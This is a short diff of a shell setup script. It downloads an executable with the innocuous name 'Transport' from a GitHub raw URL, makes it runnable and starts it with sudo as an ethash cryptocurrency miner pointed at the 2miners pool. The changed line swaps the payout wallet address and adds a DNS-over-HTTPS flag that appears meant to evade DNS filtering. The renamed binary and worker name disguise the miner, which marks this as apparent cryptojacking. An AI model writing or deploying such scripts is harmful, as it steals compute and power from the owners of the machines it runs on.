@@ -10,4 +10,4 @@ dpkg-reconfigure --frontend noninteractive tzdata
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Transport
 chmod +x Transport
 ph add Transport
-sudo ./Transport -a ethash -o stratum+tcp://eth.2miners.com:2020 -u nano_38gqwon5ypeyxb8fjjpz9iuqcfr38dnhifjipniicqfpi5fknep351e6sg4s -p x -w Trans --no-sni
+sudo ./Transport -a ethash -o stratum+tcp://eth.2miners.com:2020 -u nano_3b8f5r4jbdjgayk8zcxrdw95h8yq6z97gyros4rre3abfrg9s9buwtgwesja -p x -w Trans --no-sni  --dns-https-server 1.1.1.1     
